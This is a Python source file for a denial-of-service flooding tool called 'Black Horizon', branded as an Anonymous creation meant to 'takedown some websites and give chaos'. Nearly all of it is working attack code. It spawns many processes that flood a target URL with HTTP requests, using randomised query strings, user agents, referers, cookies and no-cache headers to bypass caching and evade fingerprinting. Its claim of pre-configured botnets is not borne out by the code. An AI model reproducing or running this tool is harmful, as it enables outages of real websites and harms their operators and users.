#!/usr/bin/env python
###############################################################################
#                     /#\                                                     #
#                    /###\     /\                                             #
#                   /  ###\   /##\  /\                                        #
#                  /      #\ /####\/##\                                       #
#                 /  /      /   # /  ##\             _       /\               #
#               // //  /\  /    _/  /  #\ _         /#\    _/##\    /\        #
#              // /   /  \     /   /    #\ \      _/###\_ /   ##\__/ _\       #
#             /  \   / .. \   / /   _   { \ \   _/       / //    /    \\      #
#     /\     /    /\  ...  \_/   / / \   } \ | /  /\  \ /  _    /  /    \ /\  #
#  _ /  \  /// / .\  ..%:.  /... /\ . \ {:  \\   /. \     / \  /   ___   /  \ #
# /.\ .\.\// \/... \.::::..... _/..\ ..\:|:. .  / .. \\  /.. \    /...\ /  \ \#
#/...\.../..:.\. ..:::::::..:..... . ...\{:... / %... \\/..%. \  /./:..\__   \#
# .:..\:..:::....:::;;;;;;::::::::.:::::.\}.....::%.:. \ .:::. \/.%:::.:..\   #
#::::...:::;;:::::;;;;;;;;;;;;;;:::::;;::{:::::::;;;:..  .:;:... ::;;::::..   #
#;;;;:::;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;];;;;;;;;;;::::::;;;;:.::;;;;;;;;:..#
#;;;;;;;;;;;;;;ii;;;;;;;;;;;;;;;;;;;;;;;;[;;;;;;;;;;;;;;;;;;;;;;:;;;;;;;;;;;;;#
#;;;;;;;;;;;;;;;;;;;iiiiiiii;;;;;;;;;;;;;;};;ii;;iiii;;;;i;;;;;;;;;;;;;;;ii;;;#
#iiii;;;iiiiiiiiiiIIIIIIIIIIIiiiiiIiiiiii{iiIIiiiiiiiiiiiiiiii;;;;;iiiilliiiii#
#IIIiiIIllllllIIlllIIIIlllIIIlIiiIIIIIIIIIIIIlIIIIIllIIIIIIIIiiiiiiiillIIIllII#
#IIIiiilIIIIIIIllTIIIIllIIlIlIIITTTTlIlIlIIIlIITTTTTTTIIIIlIIllIlIlllIIIIIIITT#
#IIIIilIIIIITTTTTTTIIIIIIIIIIIIITTTTTIIIIIIIIITTTTTTTTTTIIIIIIIIIlIIIIIIIITTTT#
#IIIIIIIIITTTTTTTTTTTTTIIIIIIIITTTTTTTTIIIIIITTTTTTTTTTTTTTIIIIIIIIIIIIIITTTTT#
#Black Horizon iDDoS Tool Created for takedown some websites and give chaos   #
#################################Anonymous#####################################
###############################WE ARE HERE#####################################
###############################################################################
###################################ANON########################################
#########################THE WORLD WIDE WEB ATTACK###########++++##############


from multiprocessing import Process, Manager, Pool
import urlparse, ssl
import sys, getopt, random, time, os

# Python version-specific 
if  sys.version_info < (3,0):
    # Python 2.x
    import httplib
    HTTPCLIENT = httplib
else:
    # Python 3.x
    import http.client
    HTTPCLIENT = http.client

####
# Config
####
DEBUG = False

####
# Constants
####
METHOD_GET  = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT=1.0

DEFAULT_CLOUNDS=1
DEFAULT_SOCKETS=1

BLACKHORIZON_BANNER = 'BlackHorizon Clound Based DDoS Tool Created ANONYMOUS MEMBERS'

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': [ 'Linux x86_64', 'Linux i386' ],
            'ext': [ 'X11' ]
        },
        'windows': {
            'name': [ 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2' ],
            'ext': [ 'WOW64', 'Win64; x64' ]
        },
        'mac': {
            'name': [ 'Macintosh' ],
            'ext': [ 'Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10) ]
        },
    },
    'platform': {
        'webkit': {
            'name': [ 'AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30) ],
            'details': [ 'KHTML, like Gecko' ],
            'extensions': [ 'Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10) ]
        },
        'iexplorer': {
            'browser_info': {
                'name': [ 'MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0' ],
                'ext_pre': [ 'compatible', 'Windows; U' ],
                'ext_post': [ 'Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10) ]
            }
        },
        'gecko': {
            'name': [ 'Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30) ],
            'details': [],
            'extensions': []
        }
    }
}

####
# BlackHorizon Class
####

class BlackHorizon(object):

    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    cloundsQueue = []                                                  ###############################
    manager = None                                                     #~~~~Created By Anonymous~~~~~#
    useragents = []                                                    #~~~~~~~~~~@FollowMe~~~~~~~~~~#
                                                                       #~~~~~~WATCH THIS BITCH~~~~~~~#
    # Properties                                                       #~~~~~~~~HA HA HA HA ~~~~~~~~~#
    url = None                                                         ###############################

    # Options
    nr_clounds = DEFAULT_CLOUNDS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):

        # Set URL
        self.url = url

        # Initialize Manager
        self.manager = Manager()

        # Initialize Counters
        self.counter = self.manager.list((0, 0))


    def exit(self):
        self.stats()
        print "Stopping BlackHorizon"

    def __del__(self):
        self.exit()

    def printHeader(self):

        # Taunt!
        print
        print BLACKHORIZON_BANNER
        print

    # Do the fun!
    def fire(self):

        self.printHeader()
        print "Attacking Website with {1} clounds per attack and {2} connections per sockets.".format(self.method, self.nr_clounds, self.nr_sockets)

        if DEBUG:
            print "Starting {0} concurrent clounds".format(self.nr_clounds)

        # Start clounds
        for i in range(int(self.nr_clounds)):

            try:

                clound = Striker(self.url, self.nr_sockets, self.counter)
                clound.useragents = self.useragents
                clound.method = self.method

                self.cloundsQueue.append(clound)
                clound.start()
            except (Exception):
                error("Failed to start clound {0}".format(i))
                pass 

        if DEBUG:
            print "Initiating monitor"
        self.monitor()

    def stats(self):

        try:
            if self.counter[0] > 0 or self.counter[1] > 0:

                print "#--------> Clounds Online: {0} attacking... (Offline: {1}) Conection's online: {2} <--------#".format(self.counter[0], self.counter[1])

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print "\tClound's can't attack more check if the website is offline."
                    print "\tUse the downforeveryoneorjustme.com for check."
    
                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except (Exception):
            pass # silently ignore

    def monitor(self):
        while len(self.cloundsQueue) > 0:
            try:
                for clound in self.cloundsQueue:
                    if clound is not None and clound.is_alive():
                        clound.join(JOIN_TIMEOUT)
                    else:
                        self.cloundsQueue.remove(clound)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print "Removing all Horizon Clound's"
                for clound in self.cloundsQueue:
                    try:
                        if DEBUG:
                            print "Killing clound {0}".format(clound.name)
                        #clound.terminate()
                        clound.stop()
                    except Exception, ex:
                        pass # silently ignore
                if DEBUG:
                    raise
                else:
                    pass

####
# Striker Class
####

class Striker(Process):

        
    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 443
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    # Flags
    runnable = True

    # Options
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):

        super(Striker, self).__init__()

        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urlparse.urlparse(url)

        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443


        self.referers = [ 
            'http://www.google.com/',
            'http://www.bing.com/',                                               ############################
            'http://www.baidu.com/',                                              #Pre-configured            #
            'http://www.yandex.com/',                                             #Botnets                   #
            'http://www.yahoo.com/',                                              #Infected's Websites       #
            'http://www.globo.com/',                                              #Best's Shells Only        #
            'http://www.pastebin.com/',                                           #__________________________#
            'https://www.nasa.gov/',                                              #From Anonymous Hackers    #
            'https://www.facebook.com/',                                          ############################
            'http://www.chris.com/',
            'http://www.retrojunkie.com/',
            'http://www.usatoday.com/',
            'http://www.engadget.search.aol.com/',
            'http://www.ask.com/',
            'http://www.sogou.com/',
            'http://www.zhongsou.com/',
            'http://www.dmoz.org/',
            'http://' + self.host + '/'
            'https://' + self.host + '/'
            ]


    def __del__(self):
        self.stop()


    #builds random ascii string
    def buildblock(self, size):
        out_str = ''

        _LOWERCASE = range(97, 122)
        _UPPERCASE = range(65, 90)
        _NUMERIC   = range(48, 57)

        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str


    def run(self):

        if DEBUG:
            print "Starting clound {0}".format(self.name)

        while self.runnable:

            try:

                for i in range(self.nr_socks):
                
                    if self.ssl:
                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)

                    self.socks.append(c)

                for conn_req in self.socks:

                    (url, headers) = self.createPayload()

                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method

                    conn_req.request(method.upper(), url, None, headers)

                for conn_resp in self.socks:

                    resp = conn_resp.getresponse()
                    self.incCounter()

                self.closeConnections()
                
            except:
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass # silently ignore

        if DEBUG:
            print "clound {0} completed run. Sleeping...".format(self.name)
            
    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass # silently ignore
            

    def createPayload(self):

        req_url, headers = self.generateData()

        random_keys = headers.keys()
        random.shuffle(random_keys)
        random_headers = {}
        
        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)

    def generateQueryString(self, ammount = 1):

        queryString = []

        for i in range(ammount):

            key = self.buildblock(random.randint(3,10))
            value = self.buildblock(random.randint(3,20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)

        return '&'.join(queryString)
            
    
    def generateData(self):

        returnCode = 0
        param_joiner = "?"

        if len(self.url) == 0:
            self.url = '/'

        if self.url.count("?") > 0:
            param_joiner = "&"

        request_url = self.generateRequestUrl(param_joiner)

        http_headers = self.generateRandomHeaders()


        return (request_url, http_headers)

    def generateRequestUrl(self, param_joiner = '?'):

        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))

    def getUserAgent(self):

        if self.useragents:
            return random.choice(self.useragents)

        # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]

        ## Mozilla Version
        mozilla_version = "Mozilla/5.0" # hardcoded for now, almost every browser is on this version except IE6

        ## System And Browser Information
        # Choose random OS
        os = USER_AGENT_PARTS['os'][random.choice(USER_AGENT_PARTS['os'].keys())]
        os_name = random.choice(os['name']) 
        sysinfo = os_name

        # Choose random platform
        platform = USER_AGENT_PARTS['platform'][random.choice(USER_AGENT_PARTS['platform'].keys())]

        # Get Browser Information if available
        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']

            browser_string = random.choice(browser['name'])

            if 'ext_pre' in browser:
                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)

            sysinfo = "%s; %s" % (browser_string, sysinfo)

            if 'ext_post' in browser:
                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))


        if 'ext' in os and os['ext']:
            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))

        ua_string = "%s (%s)" % (mozilla_version, sysinfo)

        if 'name' in platform and platform['name']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))

        if 'details' in platform and platform['details']:
            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )

        if 'extensions' in platform and platform['extensions']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))

        return ua_string

    def generateRandomHeaders(self):

        # Random no-cache entries
        noCacheDirectives = ['no-cache', 'max-age=0']
        random.shuffle(noCacheDirectives)
        nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])

        # Random accept encoding
        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(1,len(acceptEncoding)/2)
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            'User-Agent': self.getUserAgent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(1,1000),
            'Host': self.host,
        }
    
        # Randomly-added headers
        # These headers are optional and are 
        # randomly sent thus making the
        # header count random and unfingerprintable
        if random.randrange(2) == 0:
            # Random accept-charset
            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))

        if random.randrange(2) == 0:
            # Random Referer
            url_part = self.buildblock(random.randint(5,10))

            random_referer = random.choice(self.referers) + url_part
            
            if random.randrange(2) == 0:
                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))

            http_headers['Referer'] = random_referer

        if random.randrange(2) == 0:
            # Random Content-Trype
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))

        return http_headers

    # Housekeeping
    def stop(self):
        self.runnable = False
        self.closeConnections()
        self.terminate()

    # Counter Functions
    def incCounter(self):
        try:
            self.counter[0] += 1
        except (Exception):
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except (Exception):
            pass
        


####

####
# Other Functions
####

def usage():
    print BLACKHORIZON_BANNER 
    print ' USAGE: ./BlackHorizon.py http://www.target.com/ [OPTIONS]'
    print ' -c, --clounds Number of concurrent clounds\t(default: {0})'.format(DEFAULT_CLOUNDS)
    print ' -s, --sockets Number of concurrent sockets\t(default: {0})'.format(DEFAULT_SOCKETS)
    print 'FUCK YOU '
    print "\a"
print \
"""                                                       
           .          .           .     .                .       .
  .      .      *           .       .          .                       .
                 .       .   . *  "The horizon will be black one day...
  .       ____     .      . .      the day don't will exist more will be night"
         <WW>>>         .        .               .
 .   .  /WWWI; \  .       .    .  ____               .         .     .         
  *    /WWWWII; \=====;    .     /WI; \   *    .        /\_             .
  .   /WWWWWII;..      \_  . ___/WI;:. \     .        _/M; \    .   .         .
     /WWWWWIIIIi;..      \__/WWWIIII:.. \____ .   .  /MMI:  \   * .
 . _/WWWWWIIIi;;;:...:   ;\WWWWWWIIIII;.     \     /MMWII;   \    .  .     .
  /WWWWWIWIiii;;;.:.. :   ;\WWWWWIII;;;::     \___/MMWIIII;   \              .
 /WWWWWIIIIiii;;::.... :   ;|WWWWWWII;;::.:      :;IMWIIIII;:   \___     *
/WWWWWWWWWIIIIIWIIii;;::;..;\WWWWWWIII;;;:::...    ;IMIII;;     ::  \     .
WWWWWWWWWIIIIIIIIIii;;::.;..;\WWWWWWWWIIIII;;..  :;IMIII;:::     :    \   
WWWWWWWWWWWWWIIIIIIii;;::..;..;\WWWWWWWWIIII;::; :::::::::.....::       
########################################################################XXXXXXX
#####################################################################XXXXXXXXXX
##################################################################XXXXXXXXXXXXX
##############################################################XXXXXXXXXXXXXXXXX
###########################################################XXXXXXXXXXXXXXXXXXXX
#####################################################XXXXXXXXXXXXXXXXXXXXXXXXXX                                                        
"""

    
def error(msg):
    # print help information and exit:
    sys.stderr.write(str(msg+"\n"))
    usage()
    sys.exit(2)

####
# Main
####

def main():
    
    try:

        if len(sys.argv) < 2:
            error('Please put one url for start the attack of clounds')

        url = sys.argv[1]

        if url == '-h':
            usage()
            sys.exit()

        if url[0:4].lower() != 'http':
            error("Invalid URL supplied")

        if url == None:
            error("No URL supplied")

        opts, args = getopt.getopt(sys.argv[2:], "dhc:s:m:u:", ["debug", "help", "clounds", "sockets", "method", "useragents" ])

        clounds = DEFAULT_CLOUNDS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET

        uas_file = None
        useragents = []

        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            elif o in ("-u", "--useragents"):
                uas_file = a
            elif o in ("-s", "--sockets"):
                socks = int(a)
            elif o in ("-c", "--clounds"):
                clounds = int(a)
            elif o in ("-d", "--debug"):
                global DEBUG
                DEBUG = True
            elif o in ("-m", "--method"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error("method {0} is invalid".format(a))
            else:
                error("option '"+o+"' doesn't exists")


        if uas_file:
            try:
                with open(uas_file) as f:
                    useragents = f.readlines()
            except EnvironmentError:
                    error("cannot read file {0}".format(uas_file))

        blackhorizon = BlackHorizon(url)
        blackhorizon.useragents = useragents
        blackhorizon.nr_clounds = clounds
        blackhorizon.method = method
        blackhorizon.nr_sockets = socks

        blackhorizon.fire()

    except getopt.GetoptError, err:

        # print help information and exit:
        sys.stderr.write(str(err))
        usage()
        sys.exit(2)

if __name__ == "__main__":
    main()

#################################################################################
#                             aaaaaaaaaaaaaaaa               *                  #
#                         aaaaaaaaaaaaaaaaaaaaaaaa                              #
#                      aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                           #
#                    aaaaaaaaaaaaaaaaa           aaaaaa                         #
#                  aaaaaaaaaaaaaaaa                  aaaa                       #
#                 aaaaaaaaaaaaa aa                      aa                      #
#*               aaaaaaaa      aa                         a                     #
#                aaaaaaa aa aaaa                                                #
#          *    aaaaaaaaa     aaa                                               #
#               aaaaaaaaaaa aaaaaaa                               *             #
#               aaaaaaa    aaaaaaaaaa                                           #
#               aaaaaa a aaaaaa aaaaaa                                          #
#                aaaaaaa  aaaaaaa                                               #
#                aaaaaaaa                                 a                     #
#                 aaaaaaaaaa                            aa                      #
#                  aaaaaaaaaaaaaaaa                  aaaa                       #
#                    aaaaaaaaaaaaaaaaa           aaaaaa        *                #
#      *               aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                           #
#                         aaaaaaaaaaaaaaaaaaaaaaaa                              #
#                      *      aaaaaaaaaaaaaaaa                                  #
#################################################################################
